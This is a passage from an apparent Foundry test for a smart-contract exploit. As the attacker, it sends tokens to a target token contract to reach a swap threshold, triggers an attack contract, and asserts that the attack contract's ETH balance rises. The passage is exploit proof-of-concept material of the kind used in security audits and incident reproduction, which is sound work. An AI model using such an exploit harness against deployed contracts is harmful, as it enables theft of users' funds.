            vm.prank(attacker);
            IERC20(TARGET).transfer(TARGET, swapTokensAtAmount - contractTokenBalance);
        }

        // Start the attack
        uint256 initialBalance = address(newAttackContract).balance;
        console.log("Initial attack contract balance:", initialBalance);

        // Trigger the attack
        newAttackContract.startAttack();

        // Check if we gained ETH
        uint256 finalBalance = address(newAttackContract).balance;
        console.log("Final attack contract balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Attack should increase ETH balance");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

